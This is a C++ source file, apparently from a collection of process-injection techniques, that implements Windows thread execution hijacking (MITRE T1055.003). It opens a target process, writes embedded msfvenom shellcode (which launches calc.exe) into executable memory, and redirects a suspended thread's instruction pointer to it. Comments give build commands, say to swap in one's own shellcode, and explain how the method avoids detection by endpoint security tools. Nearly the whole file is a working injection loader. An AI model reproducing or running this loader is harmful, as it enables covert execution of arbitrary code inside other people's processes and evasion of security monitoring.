/*
 * Thread Execution Hijacking - MITRE ATT&CK T1055.003
 *
 * Plain English:
 *   Freeze an existing thread of the target, rewrite its CPU program
 *   counter (RIP on x64) so it points at our shellcode, then resume.
 *   The target's own thread runs our code as its very next
 *   instruction, at full speed.
 *
 * What makes it different from the others:
 *   NO new thread AND the fire is deterministic (unlike APC which may
 *   never fire). The hijacked thread never returns to its original job
 *   because its RIP is gone, so this technique replaces that thread.
 *   Best choice when you need both stealth and reliability.
 *
 * Pick any thread of a running target. Suspend it. Write shellcode into
 * the target's address space. Rewrite that thread's RIP to point at the
 * shellcode. Resume. The target's own thread runs the shellcode as its
 * next instruction.
 *
 * Difference from classic_injection.cpp (T1055.002):
 *   classic creates a brand-new remote thread, which many EDRs flag
 *   because the thread's start address sits in an unbacked RWX region.
 *   Thread hijacking reuses an EXISTING thread, so no "new thread"
 *   event fires. The trade-off is that the hijacked thread never
 *   returns to its original work (RIP is gone), so the caller usually
 *   picks a non-critical thread or uses a return-stub.
 *
 * MinGW cross-compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o thread_hijack.exe thread_hijack.cpp
 *
 * MSVC:
 *   cl /std:c++20 thread_hijack.cpp /Fe:thread_hijack.exe
 *
 * Usage:
 *   thread_hijack.exe <PID|name>        shellcode -> target (calc pops)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
 * msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
 * Replace with your own shellcode, EXITFUNC=thread so the hijacked
 * thread does not kill the host when the payload ends.
 */
unsigned char default_shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";

static bool is_all_digits(const char* s) {
    if (!s || !*s) return false;
    for (; *s; s++) if (*s < '0' || *s > '9') return false;
    return true;
}

static DWORD find_pid_by_name(const char* name) {
    char target[260]; strncpy_s(target, sizeof(target), name, _TRUNCATE);
    size_t n = strlen(target);
    if (n < 4 || _stricmp(target + n - 4, ".exe") != 0) {
        strncat_s(target, sizeof(target), ".exe", _TRUNCATE);
    }
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD best = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, target) == 0) { best = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return best;
}

/*
 * Find the first thread of the target that is not currently suspended
 * and not the process's main thread holding critical locks. Simplest
 * heuristic: take the first thread whose suspend-count is 0.
 */
static DWORD pick_victim_thread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 te = { sizeof(te) };
    DWORD chosen = 0;
    if (Thread32First(snap, &te)) do {
        if (te.th32OwnerProcessID != pid) continue;
        chosen = te.th32ThreadID;
        break;
    } while (Thread32Next(snap, &te));
    CloseHandle(snap);
    return chosen;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <PID|name>\n", argv[0]);
        return 1;
    }

    DWORD pid = 0;
    if (is_all_digits(argv[1])) {
        pid = (DWORD)strtoul(argv[1], nullptr, 10);
    } else {
        pid = find_pid_by_name(argv[1]);
        if (!pid) { printf("[-] no process named '%s'\n", argv[1]); return 2; }
    }
    printf("[+] target PID: %lu\n", pid);

    DWORD tid = pick_victim_thread(pid);
    if (!tid) { printf("[-] no threads found in PID %lu\n", pid); return 3; }
    printf("[+] hijack thread TID: %lu\n", tid);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess failed (%lu)\n", GetLastError()); return 4; }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) { printf("[-] OpenThread failed (%lu)\n", GetLastError()); return 5; }

    SIZE_T sc_len = sizeof(default_shellcode);
    LPVOID remote = VirtualAllocEx(hProc, nullptr, sc_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) { printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError()); return 6; }

    SIZE_T wrote = 0;
    if (!WriteProcessMemory(hProc, remote, default_shellcode, sc_len, &wrote) || wrote != sc_len) {
        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
        return 7;
    }
    printf("[+] shellcode written to %p (%llu bytes)\n", remote, (unsigned long long)wrote);

    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[-] SuspendThread failed (%lu)\n", GetLastError());
        return 8;
    }

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] GetThreadContext failed (%lu)\n", GetLastError());
        ResumeThread(hThread);
        return 9;
    }
    printf("[+] original RIP: 0x%llx\n", (unsigned long long)ctx.Rip);

    ctx.Rip = (DWORD64)remote;
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[-] SetThreadContext failed (%lu)\n", GetLastError());
        ResumeThread(hThread);
        return 10;
    }
    printf("[+] RIP hijacked to %p\n", remote);

    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[-] ResumeThread failed (%lu)\n", GetLastError());
        return 11;
    }

    printf("[+] done. The hijacked thread will run the shellcode on its next scheduling slice.\n");
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
